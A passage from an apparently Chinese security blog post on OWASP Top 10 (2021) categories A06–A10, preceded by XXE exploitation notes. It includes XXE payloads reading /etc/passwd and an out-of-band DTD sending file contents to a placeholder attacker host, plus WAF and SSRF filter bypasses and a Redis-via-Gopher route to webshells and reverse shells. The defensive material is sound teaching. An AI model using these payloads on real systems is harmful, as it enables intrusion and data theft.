title="XXE利用方式"></a>XXE利用方式</h4><p>1.有回显情况</p><p>结合外部实体声明（实体名称 SYSTEM ”uri&#x2F;url“）和参数实体（% 实体名称 SYSTEM “uri-外部dtd”）有两种方式进行注入攻击</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [<span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">foo</span> <span class="hljs-keyword">ANY</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span><br></code></pre></td></tr></table></figure><p>引用外部dtd：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [<span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">foo</span> <span class="hljs-keyword">ANY</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://xxx/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%xxe;]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;evil;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span><br></code></pre></td></tr></table></figure><p>evil.dtd：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY %evil <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///ect/passwd&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>2.无回显的情况</p><p>可以使用外带数据提取通道提取数据，先用file:&#x2F;&#x2F;获取目标文件内容，然后将内容以http请求等发送到接收数据的服务器</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">updateProfile</span>[</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://xxx/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%dtd;</span><br><span class="hljs-meta">%send;</span><br><span class="hljs-meta">]&gt;</span><br></code></pre></td></tr></table></figure><p>evil.dtd，内部的%要进行实体编码成&amp;#x25</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">all</span></span><br><span class="hljs-meta"><span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25 send SYSTEM &#x27;http://xxx.xxx.xxx.xxx/?data=%file;&#x27;&gt;&quot;</span></span><br><span class="hljs-meta">&gt;</span><br>%all;<br></code></pre></td></tr></table></figure><p>XXE解析一般在导入配置、数据传输接口等场景会用到，涉及到XML文件处理的场景可以查看XML解析器是否禁用外部实体</p><p>防御：使用语言中推荐的禁用外部实体的方法</p><p><strong>PHP：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><p><strong>JAVA:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">DocumentBuilderFactory</span> <span class="hljs-variable">dbf</span> <span class="hljs-operator">=</span>DocumentBuilderFactory.newInstance();<br>dbf.setExpandEntityReferences(<span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure><h4 id="绕过WAF"><a href="#绕过WAF" class="headerlink" title="绕过WAF"></a>绕过WAF</h4><ol><li>文档开头增加大量的空格</li><li>比较成熟的WAF设置通常不会读取链接文件的内容，因此可能不会解析指向未知实体的链接，阻止XML解析器导致错误</li><li>xml文档有多种编码方式，可以用utf-8、utf-16、utf-32，使用不同的编码方式可能绕过WAF</li><li>在一个文档中使用两种编码</li></ol><h2 id="A06-危险或过旧的组件"><a href="#A06-危险或过旧的组件" class="headerlink" title="A06 危险或过旧的组件"></a>A06 危险或过旧的组件</h2><h3 id="简述-1"><a href="#简述-1" class="headerlink" title="简述"></a>简述</h3><p>该弱点在产业调查中排名第二，有足够的资料让它进入前十。易受攻击的组件是我们努力测试和评估风险的已知问题，该弱点是在CWEs中唯一没有任何CVE对应的类别。著名的CWE包括：</p><ul><li><a href="https://cwe.mitre.org/data/definitions/1104.html">CWE-1104：使用未经维护的第三方组件</a>：产品依赖于第三方组件，这些组件不受原始开发人员或原始开发人员的受信任代理的积极支持或维护。</li></ul><h3 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h3><p>可能容易受到的攻击：</p><ul><li>如果不知道所使用的所有组件的版本(包括客户端和服务器端)。所有组件包括您直接使用的组件以及嵌套依赖项。</li><li>如果软件是有漏洞的，不受支持的或者是老旧的。这包括操作系统、Web应用或服务器，数据库管理系统（DBMS）、应用、APIs以及所有的组件、运行时环境和库。</li><li>如果没有定期扫描漏洞并订阅与所使用组件相关的安全公告。</li><li>如果没有以基于风险的、及时的方式修复或者升级底层平台、框架或者依赖项。这种情况通常发生在修补是变更控制下的每月或每季度的任务，会导致面临几天或者几个月的固定漏洞的不必要的暴露。</li><li>如果软件开发人员不测试更新、升级或打了补丁的库的兼容性。</li><li>如果您不保护组件的配置（A05）</li></ul><h3 id="如何预防-1"><a href="#如何预防-1" class="headerlink" title="如何预防"></a>如何预防</h3><p>以下场景应该有补丁管理流程：</p><ul><li>移除未使用的依赖、不必要的功能、组件、文件和文档。</li><li>使用versions、OWASP Dependency Check、retirement .js等工具，持续盘点客户端和服务器端组件(如框架、库)的版本及其依赖性。持续监控组件中的漏洞来源，如常见漏洞和披露(CVE)和国家漏洞数据库(NVD)。使用软件组合分析工具来实现过程的自动化。订阅与所使用组件相关的安全漏洞的电子邮件警报。</li><li>只能通过安全链接从官方来源获取组件。最好使用签名包，以减少包含修改过的恶意组件的机会（A08）。</li><li>监视未维护或未为旧版本创建安全补丁的库和组件。如果不可能打补丁，请考虑部署虚拟补丁来监视、检测或保护所发现的问题。</li></ul><p>每个组织都必须确保为应用程序或项目组合的生命周期制定监视、分类和应用更新或配置更改的持续计划。</p><h3 id="攻击实例-1"><a href="#攻击实例-1" class="headerlink" title="攻击实例"></a>攻击实例</h3><p><strong>情境 #1：</strong>组件通常是以与应用程序相同的权限去运行，因此任何组件中的缺陷都可能导致严重的后果。这种缺陷可能是偶然的（比如编程时的错误）或者是故意的（例如组件中的后门）</p><ul><li>CVE-2017-5638：一个 Struts 2 远端程式码执行漏洞，可以在服务器上执行任意代码，已被归咎于重大漏洞。</li><li>虽然物联网 (IoT) 设备通常很难或无法修补，但修补它们可能很重要。 （例如，生物医学设备）。</li></ul><p>有一些自动化工具可以帮助攻击者找到未修补或配置错误的系统。例如，Shodan IoT 搜索引擎可以帮助您找到存在 2014 年 4 月未修补 Heartbleed 漏洞的设备。</p><h2 id="A07-认证及验证机制失效"><a href="#A07-认证及验证机制失效" class="headerlink" title="A07 认证及验证机制失效"></a>A07 认证及验证机制失效</h2><h3 id="简述-2"><a href="#简述-2" class="headerlink" title="简述"></a>简述</h3><p>之前被称为“被破坏的身份验证”，该类别从第二名下滑至第八名，其中著名的CWE包括：</p><ul><li><a href="https://cwe.mitre.org/data/definitions/297.html">CWE-297：对证书的不正确验证，主机不匹配</a>：软件与提供证书的主机通信，但软件无法正确确保证书实际与该主机关联。</li><li><a href="https://cwe.mitre.org/data/definitions/287.html">CWE-287：不正确的身份验证</a>：当参与者声称具有给定的身份时，该软件不会证明或不充分证明该声明是正确的。例如：服务器没有限制登录尝试次数 、使用客户端不受信任的参数作为登录成功的标识。</li><li><a href="https://cwe.mitre.org/data/definitions/384.html">CWE-384： 会话固定</a>：在不使任何现有会话标识符无效的情况下对用户进行身份验证或以其他方式建立新的用户会话，使攻击者有机会窃取经过身份验证的会话。</li></ul><h3 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h3><p>确认用户的身份、身份验证和会话管理对于防止与身份验证相关的攻击至关重要。如果应用程序满足以下条件，则可能存在身份验证弱点：</p><ul><li>允许自动攻击，例如凭据填充，其中攻击者拥有有效用户名和密码的列表。</li><li>允许暴力破解或者其他自动攻击。</li><li>使用默认的、强度弱的或者众所周知的密码，比如“admin&#x2F;admin”</li><li>使用弱或者无效的凭据恢复和忘记密码的过程，例如“基于知识的答案”，这些过程无法确保安全。</li><li>使用纯文本、加密或弱哈希密码数据存储</li><li>具有缺失或者无效的多重身份认证</li><li>在URL中公开会话标识符</li><li>成功登录后重用会话标识符</li><li>不能正确的让会话ID失效。用户会话或身份验证令牌在注销或者处于非活动状态期间不会正确失效。</li></ul><h3 id="如何预防-2"><a href="#如何预防-2" class="headerlink" title="如何预防"></a>如何预防</h3><ul><li>如果可能，请实施多重身份验证，以防止自动凭据填充、暴力破解和凭据被盗重用攻击。</li><li>不要使用任何默认凭据进行交付或部署，特别是对于管理员用户。</li><li>实施弱密码检查，例如针对前 10，000 个最差密码列表测试新密码或已更改密码。</li><li>使密码长度、复杂性和轮换策略与美国国家标准与技术研究院 （NIST） 800-63b 在 5.1.1 节中针对“记住的机密”或其他基于证据的现代密码策略的指南保持一致。</li><li>通过对所有消息结果使用相同的消息，确保注册、凭据恢复等对帐户枚举攻击进行强化</li><li>限制或者逐渐延迟失败登录的尝试，但是注意不能拒绝服务。记录所有的错误，并在检测到撞库、暴力破解或者其他攻击时向管理员发出警报。</li><li>使用服务器端、安全的内置会话管理器，该管理器在登录后生成具有高熵值的新随机会话ID。会话标识符不应位于URL中，应安全存储，并在注销、空闲和绝对超时后失效。</li></ul><h3 id="攻击实例-2"><a href="#攻击实例-2" class="headerlink" title="攻击实例"></a>攻击实例</h3><p><strong>场景 #1：</strong>凭据填充，即使用已知密码列表，是一种常见的攻击。假设应用程序未实现自动威胁或撞库保护。在这种情况下，应用程序可以用作密码预言机，以确定凭据是否有效。</p><p><strong>场景 #2：</strong>大多数身份验证攻击是由于持续使用密码作为唯一因素而发生的。一旦被认为是最佳实践，密码轮换和复杂性要求就会鼓励用户使用和重用弱密码。建议组织根据 NIST 800-63 停止这些做法，并使用多重身份验证。</p><p><strong>场景 #3：</strong>应用程序会话超时设置不正确。用户使用公共计算机访问应用程序。用户无需选择“注销”，只需关闭浏览器选项卡即可离开。攻击者在一小时后使用相同的浏览器，并且用户仍经过身份验证。</p><h2 id="A08-软件和数据完整性失效"><a href="#A08-软件和数据完整性失效" class="headerlink" title="A08 软件和数据完整性失效"></a>A08 软件和数据完整性失效</h2><h3 id="简述-3"><a href="#简述-3" class="headerlink" title="简述"></a>简述</h3><p>2021年新增的类别，侧重于在不验证完整性的情况下做出与软件更新、关键数据和CI&#x2F;CD管道相关的假设。著名的CWE包括：</p><ul><li><a href="https://cwe.mitre.org/data/definitions/829.html">CWE-829：包含来自不受信任的控制领域的功能 </a>：软件从预期控制范围之外的源导入、要求或包含可执行功能（如库）。</li><li><a href="https://cwe.mitre.org/data/definitions/494.html">CWE-494：下载不进行完整性检查的代码 </a>：产品从远程位置下载源代码或可执行文件并执行代码，而无需充分验证代码的来源和完整性。攻击者可以通过破坏主机服务器、执行 DNS 欺骗或修改传输中的代码来执行恶意代码。</li><li><a href="https://cwe.mitre.org/data/definitions/502.html">CWE-502：不可信数据的反序列化</a>：应用程序会反序列化不受信任的数据，而无需充分验证生成的数据是否有效。</li></ul><h3 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h3><p>软件和数据完整性故障与无法防止完整性违规的代码和基础结构有关。</p><p>这方面的一个例子是，应用程序依赖于来自不受信任的源、存储库和内容交付网络 （CDN） 的插件、库或模块。不安全的 CI&#x2F;CD 管道可能会引入未经授权的访问、恶意代码或系统危害的可能性。最后，许多应用程序现在都包含自动更新功能，其中更新在没有充分完整性验证的情况下下载并应用于以前受信任的应用程序。攻击者可能会上传自己的更新，以便在所有安装上分发和运行。</p><p>另一个示例是，对象或数据被编码或序列化为一个结构，攻击者可以看到和修改该结构容易受到不安全的反序列化的影响。</p><h3 id="如何预防-3"><a href="#如何预防-3" class="headerlink" title="如何预防"></a>如何预防</h3><ul><li>使用数字签名或者类似的机制来验证软件或者数据是否来自预期的源且没有被更改。</li><li>确保库和依赖项（如npm或者maven）正在使用受信任的存储库。</li><li>确保使用软件供应链安全工具（如OWASP依赖关系检查）来验证组件是否不包含已知漏洞。</li><li>确保有代码和配置更改的审查过程，以最大限度地减少恶意代码或者配置被引入软件管道的可能性</li><li>确保CI&#x2F;CD管道具有适当的隔离、配置和访问控制，以确保流经生成和部署过程的代码的完整性</li><li>确保未签名或未加密的序列化数据不会在没有某种形式的完整性检查或数字签名的情况下发送到不受信任的客户端，以检测序列化数据的篡改或重放</li></ul><h3 id="攻击实例-3"><a href="#攻击实例-3" class="headerlink" title="攻击实例"></a>攻击实例</h3><p><strong>情境 #1 不带签名的更新：</strong>许多家用路由器、机顶盒、设备固件等不通过签名固件验证更新。未签名的固件是攻击者不断增长的目标，预计只会变得更糟。这是一个主要问题，因为很多时候，除了在将来的版本中修复并等待以前的版本老化之外，没有其他机制可以修复。</p><p><strong>情境 #2 不安全的反序列化</strong>：一个反应式应用程序调用 Spring Boot 微服务。程序设计师们试图确保他们的代码是不可变的。他们的解决方案是在双向所有请求讯息中包含序列化的用户状态。攻击者注意到“R00”Java 对象签名（在base64中）并使用 Java Serial Killer 工具(用来执行 Java 反序列化攻击)在应用程序服务器上获取远程代码执行权限。</p><p><strong>情境 #3 SolarWinds 恶意更新</strong>：众所周知，某些国家会攻击更新机制，最近一次值得注意的是对 SolarWinds Orion 的攻击。该软体开发商拥有安全构建和更新完整性流程。尽管如此，这些流程仍被破坏并在几个月时间中向 18,000 多个组织送出高度针对性的恶意更新，其中大约 100 个组织受到了影响。这是历史上这一性质影响最深远和最重要的破坏之一。</p><h2 id="A09-安全日志和监控失效"><a href="#A09-安全日志和监控失效" class="headerlink" title="A09 安全日志和监控失效"></a>A09 安全日志和监控失效</h2><h3 id="简述-4"><a href="#简述-4" class="headerlink" title="简述"></a>简述</h3><p>安全记录及监控是业界调查结果 (#3)，由 2017 年的第十名稍微上升一名。记录及监控功能验证非常有挑战性，通常需要以访谈或询问的方式检验有无侦测渗透测试的攻击活动。此类别的CVE &#x2F; CVSS数据不多，但检测和响应违规行为至关重要。尽管如此，它对问责制，可见性，事件警报和取证可能非常有影响力。著名的CWE包括：</p><ul><li><a href="https://cwe.mitre.org/data/definitions/778.html">CWE-778：日志记录不足</a>：当发生安全关键事件时，软件要么不记录事件，要么在记录事件时省略有关事件的重要详细信息。</li><li><a href="https://cwe.mitre.org/data/definitions/117.html">CWE-117：日志的输出处理不正确</a>：软件不会处理或错误地处理写入日志的输出。</li><li><a href="https://cwe.mitre.org/data/definitions/223.html">CWE-223：遗漏安全相关信息</a>：应用程序不会记录或显示对于识别攻击的来源或性质或确定操作是否安全非常重要的信息。</li><li><a href="https://cwe.mitre.org/data/definitions/532.html">CWE-532：在日志文件中插入敏感信息</a>：写入日志文件的信息可能具有敏感性质，可为攻击者提供有价值的指导或公开敏感的用户信息。</li></ul><h3 id="描述-4"><a href="#描述-4" class="headerlink" title="描述"></a>描述</h3><p>此类别旨在帮助检测，升级和响应活动的违规行为。如果没有日志记录和监视，则无法检测到违规行为。日志记录、检测、监视和主动响应不足，在以下情况下可能会发生：</p><ul><li>不会记录可审核的事件，如登录、失败的登录和高价值事务。</li><li>警告和错误不会生成、不充分或不明确的日志消息。</li><li>不会监视应用程序和 API 的日志是否存在可疑活动。</li><li>日志仅存储在本地。</li><li>适当的警报阈值和响应升级过程尚未到位或无效。</li><li>动态应用程序安全测试 （DAST） 工具（如 OWASP ZAP）的渗透测试和扫描不会触发警报。</li><li>应用程序无法实时或近乎实时地对主动攻击检测、升级或发出警报。</li></ul><p>如果日志记录和警报事件对用户或攻击者可见，还会容易受到信息泄漏的影响（参阅A01：无效的访问控制）</p><h3 id="如何预防-4"><a href="#如何预防-4" class="headerlink" title="如何预防"></a>如何预防</h3><p>取决于应用风险，开发人员应实现以下部分或者全部控件：</p><ul><li>确保所有登录、访问控制和服务器端输入验证失败都可以记录在足够的用户上下文中，以识别可疑或恶意帐户，并保留足够的时间以允许延迟取证分析。</li><li>确保日志管理解决方案可以轻松使用的格式来生成日志</li><li>确保日志格式数据编码正确，以防止日志记录或监视系统进行注入或攻击。</li><li>确保高价值事务具有完整性控制的审计跟踪，以防止篡改或者删除，例如使用append-only数据库表</li><li>DevSecOps 团队应建立有效的监视和警报，以便快速检测和响应可疑活动。</li><li>建立或采用事件响应和恢复计划，例如美国国家标准与技术研究院 （NIST） 800-61r2 或更高版本。</li></ul><p>有一些商业的或者开源的应用保护框架例如OWASP ModSecurity Core Rule Set，以及开源的日志关联软件，例如Elasticsearch, Logstash, Kibana (ELK) stack，拥有功能自定义仪表盘和警报。</p><h3 id="攻击实例-4"><a href="#攻击实例-4" class="headerlink" title="攻击实例"></a>攻击实例</h3><p><strong>场景 #1：</strong>由于缺乏监控和日志记录，儿童健康计划提供商的网站运营商无法检测到违规行为。外部方通知健康计划提供者，攻击者访问并修改了超过 350 万名儿童的数千份敏感健康记录。事后审查发现，网站开发人员尚未解决重大漏洞。由于没有对系统进行日志记录或监控，数据泄露可能自2013年以来一直在进行，为期七年多。</p><p><strong>场景 #2：</strong>印度一家大型航空公司的数据泄露涉及数百万乘客十多年的个人数据，包括护照和信用卡数据。数据泄露发生在第三方云托管提供商处，该提供商在一段时间后通知了航空公司。</p><p><strong>场景 #3：</strong>一家大型欧洲航空公司遭受了GDPR应报告的违规行为。据报道，该漏洞是由攻击者利用的支付应用程序安全漏洞引起的，攻击者收集了超过400，000条客户支付记录。该航空公司因此被隐私监管机构罚款2000万英镑。</p><h2 id="A10-服务端请求伪造（SSRF）"><a href="#A10-服务端请求伪造（SSRF）" class="headerlink" title="A10 服务端请求伪造（SSRF）"></a>A10 服务端请求伪造（SSRF）</h2><h3 id="简述-5"><a href="#简述-5" class="headerlink" title="简述"></a>简述</h3><p>此类别是从前 10 名社区调查 （#1） 中添加的。数据显示，发生率相对较低，测试覆盖率高于平均水平，漏洞利用和影响潜在评级高于平均水平。CWE示例如下：</p><ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918： 服务器端请求伪造</a>：Web 服务器从上游组件接收 URL 或类似请求，并检索此 URL 的内容，但它不能充分确保将请求发送到预期的目标。</li></ul><h3 id="描述-5"><a href="#描述-5" class="headerlink" title="描述"></a>描述</h3><p>每当 Web 应用程序在未验证用户提供的 URL 的情况下获取远程资源时，就会发生 SSRF漏洞。它允许攻击者强制应用程序将精心编制的请求发送到意外的目标，即使受到防火墙、VPN 或其他类型的网络访问控制列表 （ACL） 的保护也是如此。</p><p>由于现代 Web 应用程序为最终用户提供了方便的功能，因此获取 URL 成为一种常见方案。因此，SSRF的发生率正在增加。此外，由于云服务和架构的复杂性，SSRF的严重性越来越高。</p><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p><p><img src="/images/ssrf.png"></p><h3 id="如何预防-5"><a href="#如何预防-5" class="headerlink" title="如何预防"></a>如何预防</h3><p>开发人员可以通过实现以下部分或全部深度防御控制来阻止 SSRF：</p><h4 id="从网络层"><a href="#从网络层" class="headerlink" title="从网络层"></a>从网络层</h4><ul><li>将远程资源访问功能分段到单独网络中，减少SSRF的影响</li><li>强制实施“默认拒绝”防火墙策略或网络访问控制规则，以阻止除基本 Intranet 流量之外的所有流量。<ul><li>根据应用程序建立防火墙规则的所有权和生命周期</li><li>记录防火墙上所有已接受和阻止的网络流</li></ul></li></ul><h4 id="从应用层"><a href="#从应用层" class="headerlink" title="从应用层"></a>从应用层</h4><ul><li>清理并验证所有客户输入的数据</li><li><strong>使用白名单强制实施URL协议、端口和目标</strong></li><li><strong>不要向客户端发送原始响应数据。</strong></li><li>禁用HTTP重定向</li><li>注意URL一致性，以避免诸如DNS重新绑定和“检查时间，使用时间”（TOCTOU）竞争条件之类的攻击</li></ul><p>不要通过使用黑名单或正则表达式来缓解 SSRF。攻击者拥有有效负载列表、工具和技能来绕过黑名单。</p><h4 id="其他措施"><a href="#其他措施" class="headerlink" title="其他措施"></a>其他措施</h4><ul><li><p><strong>限制不能访问内网ip</strong></p></li><li><p>不要在前端系统上部署其他与安全相关的服务（例如OpenID）。控制这些系统上的本地流量（例如本地主机）</p></li><li><p>对于具有专用和可管理用户组的前端，在独立系统上使用网络加密来考虑非常高的保护需求。</p></li></ul><h3 id="攻击实例-5"><a href="#攻击实例-5" class="headerlink" title="攻击实例"></a>攻击实例</h3><p>攻击者可以使用 SSRF 攻击受 Web 应用程序防火墙、防火墙或网络 ACL 保护的系统，使用以下方案：</p><p><strong>场景 #1：</strong>端口扫描内部服务器 – 如果网络体系结构未分段，攻击者可以绘制出内部网络，并根据连接结果或连接或拒绝 SSRF 有效负载连接所用的时间确定内部服务器上的端口是打开还是关闭。</p><p><strong>场景 #2：</strong>敏感数据泄露 – 攻击者可以访问本地文件或内部服务以获取敏感信息，例如 <code>file:///etc/passwd</code>和<code>http://localhost:28017/</code> 。</p><p><strong>场景 #3：</strong>访问云服务的元数据存储 – 大多数云提供商都有元数据存储，例如 <code>http://169.254.169.254/</code>。攻击者可以读取元数据以获取敏感信息。</p><p><strong>场景 #4：</strong>危害内部服务 – 攻击者可以滥用内部服务进行进一步的攻击，例如远程执行代码 （RCE） 或拒绝服务 （DoS）。</p><p><strong>场景 #5：</strong>如果通过端口扫描等方法发现目标主机上开放<strong>6379</strong>端口，则目标主机上很有可能存在Redis服务。此时，如果目标主机上的Redis由于没有设置密码认证、没有进行添加防火墙等原因存在未授权访问漏洞的话，那我们就可以利用Gopher协议远程操纵目标主机上的Redis，可以利用 Redis 自身的提供的 config 命令像目标主机写WebShell、写SSH公钥、创建计划任务反弹Shell等（先将Redis的本地数据库存放目录设置为web目录、~&#x2F;.ssh目录或&#x2F;var&#x2F;spool&#x2F;cron目录等，然后将dbfilename（本地数据库文件名）设置为文件名你想要写入的文件名称，最后再执行save或bgsave保存，则我们就指定的目录里写入指定的文件了）。</p><h3 id="SSRF常用的几种协议"><a href="#SSRF常用的几种协议" class="headerlink" title="SSRF常用的几种协议"></a>SSRF常用的几种协议</h3><h4 id="file"><a href="#file" class="headerlink" title="file"></a>file</h4><p>使用file协议可以尝试进行的任意文件读取，file协议的格式为：file:&#x2F;&#x2F;文件路径</p><h4 id="http"><a href="#http" class="headerlink" title="http"></a>http</h4><p>向目标发送http请求，由于get请求的参数是直接加在url里的，所以可以探测内网那些使用get请求即可攻击的应用。</p><h4 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h4><p>dict协议与http协议可用来探测内网的主机存活与端口开放情况。dict协议不支持换行符，没有办法进行换行，相当于一次只能执行一条命令，所以不能用来攻击那些需要交互的应用（比如需要认证的redis）。</p><h4 id="Gopher"><a href="#Gopher" class="headerlink" title="Gopher"></a>Gopher</h4><p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet 上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码<br>在SSRF中经常会使用Gopher来构造GET&#x2F;POST包攻击应用。</p><h3 id="SSRF绕过姿势"><a href="#SSRF绕过姿势" class="headerlink" title="SSRF绕过姿势"></a>SSRF绕过姿势</h3><h4 id="符号绕过"><a href="#符号绕过" class="headerlink" title="@符号绕过"></a>@符号绕过</h4><p><a href="http://www.baidu.com@bing.com与http//bing.com%E8%AF%B7%E6%B1%82%E6%98%AF%E7%9B%B8%E5%90%8C%E7%9A%84%E3%80%82%E8%AF%A5%E8%AF%B7%E6%B1%82%E5%BE%97%E5%88%B0%E7%9A%84%E5%86%85%E5%AE%B9%E9%83%BD%E6%98%AFbing.com%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%8C%E6%AD%A4%E7%BB%95%E8%BF%87%E5%90%8C%E6%A0%B7%E5%9C%A8URL%E8%B7%B3%E8%BD%AC%E7%BB%95%E8%BF%87%E4%B8%AD%E9%80%82%E7%94%A8%E3%80%82%E6%A0%B9%E6%9C%AC%E5%8E%9F%E5%9B%A0%E6%98%AF%E8%A7%A3%E6%9E%90URL%E7%9A%84%E6%97%B6%E5%80%99%E8%A7%84%E5%88%99%E7%9A%84%E9%97%AE%E9%A2%98">http://www.baidu.com@bing.com与http://bing.com请求是相同的。该请求得到的内容都是bing.com的内容，此绕过同样在URL跳转绕过中适用。根本原因是解析URL的时候规则的问题</a></p><h4 id="点分割符号替换"><a href="#点分割符号替换" class="headerlink" title="点分割符号替换"></a>点分割符号替换</h4><p>多数用于钓鱼邮件绕过检测，在浏览器中使用句号、空格、点+空格等形式代替</p><h4 id="本地地址多种表现形式"><a href="#本地地址多种表现形式" class="headerlink" title="本地地址多种表现形式"></a>本地地址多种表现形式</h4><p><a href="http://127.0.0.1/">http://127.0.0.1</a><br><a href="http://localhost/">http://localhost</a><br><a href="http://127.255.255.254/">http://127.255.255.254</a><br>127.0.0.1 - 127.255.255.254<br>http:&#x2F;&#x2F;[::1]<br>http:&#x2F;&#x2F;[::ffff:7f00:1]<br>http:&#x2F;&#x2F;[::ffff:127.0.0.1]<br><a href="http://127.0.0.1/">http://127.1</a><br><a href="http://127.0.0.1/">http://127.0.1</a><br><a href="http://0.0.0.0/">http://0:80</a></p><h4 id="利用IP地址进制转换"><a href="#利用IP地址进制转换" class="headerlink" title="利用IP地址进制转换"></a>利用IP地址进制转换</h4><p>转换成点分八进制或者点分16进制或整数IP地址</p><h4 id="利用短网址"><a href="#利用短网址" class="headerlink" title="利用短网址"></a>利用短网址</h4><h4 id="利用重定向"><a href="#利用重定向" class="headerlink" title="利用重定向"></a>利用重定向</h4><p>利用重定向搭建一个302跳转服务，访问302跳转到内网</p><h4 id="DNS重绑定"><a href="#DNS重绑定" class="headerlink" title="DNS重绑定"></a>DNS重绑定</h4><p>DNS的解析原理大家都知道，域名-&gt;DNS服务器查询-&gt;返回IP地址，但是域名的持有者可以随时设置解析的IP，比如访问chujian521.github.io，解析域名为185.199.109.153，但是在第二次访问之前，我们故意把域名解析修改为127.0.0.1，用户第二次访问的时候就会解析到127.0.0.1，操作系统默认会保存一段时间的IP（也可以将TTL调低），之后就会重新请求DNS，对于浏览器来说，两次访问的都是同一域名，是符合浏览器的同源策略的，但是第二次访问解析到其他IP，调用到了其他资源。</p><p>1.服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP</p><p>2.对于获得的IP进行判断，发现为指定范围IP，则通过验证</p><p>3.接下来服务器端对URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址</p><p>4.由于已经绕过验证，所以服务器端返回访问内网资源的内容</p><p>哪些语言会被DNS重绑定攻击？</p><ul><li>Java默认不存在被DNS Rebinding绕过风险（TTL默认为10）（可能会有时间竞争？）</li><li>PHP默认会被DNS Rebinding绕过，TTL默认为0</li><li>Linux默认不会进行DNS缓存</li><li>有些公共DNS服务器，比如114.114.114.114还是会把记录进行缓存，完全不按照标准协议来，8.8.8.8完全按照协议严格进行缓存</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>什么是Nginx反向代理</title>
    <link href="/blog/2022/10/15/%E4%BB%80%E4%B9%88%E6%98%AFNginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/"/>
    <url>/blog/2022/10/15/%E4%BB%80%E4%B9%88%E6%98%AFNginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/</url>
    
